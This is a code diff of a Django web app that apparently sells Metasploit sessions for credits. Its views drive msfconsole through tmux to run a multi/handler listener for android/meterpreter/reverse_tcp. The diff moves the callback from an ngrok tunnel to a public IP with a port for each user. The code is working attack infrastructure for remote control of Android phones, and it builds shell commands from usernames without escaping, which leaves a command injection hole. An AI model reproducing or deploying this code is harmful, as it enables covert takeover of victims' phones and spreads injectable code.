@@ -17,11 +17,11 @@ from django.http import JsonResponse
 ###################                  metasploit
 def add(request):
     credits = models.Credit.objects.get(user = request.user)
-    if credits.number > 0:
+    if credits.number > 0:	 
         credits.number-=1
         credits.save()
-        host='0.tcp.ngrok.io'
-        port='12457'
+        host='185.120.221.217'
+        port=4444+int(request.user.id)
         username = request.user.username
         dircd = '/root/django/users/'+ str(username)
         dir = '/root/django/users/'+ str(username)+'/'+str(username)
@@ -64,12 +64,12 @@ def listen(request):
 def startlisten(request):
     username = request.user.username
     dir = '/root/django/users/'+ str(username)+'/'+str(username)
-
+    port=4444+int(request.user.id)
     os.system('tmux send-keys -t '+str(username)+' "msfconsole""\n"')
     os.system('tmux send-keys -t '+str(username)+' "use multi/handler""\n"')
     os.system('tmux send-keys -t '+str(username)+' "set payload android/meterpreter/reverse_tcp""\n"')
-    os.system('tmux send-keys -t '+str(username)+' "set lhost 127.0.0.1""\n"')
-    os.system('tmux send-keys -t '+str(username)+' "set lport 443""\n"')
+    os.system('tmux send-keys -t '+str(username)+' "set lhost 185.120.221.217""\n"')
+    os.system('tmux send-keys -t '+str(username)+' "set lport '+str(port)+'""\n"')
     os.system('tmux send-keys -t '+str(username)+' "run""\n"')
 
 
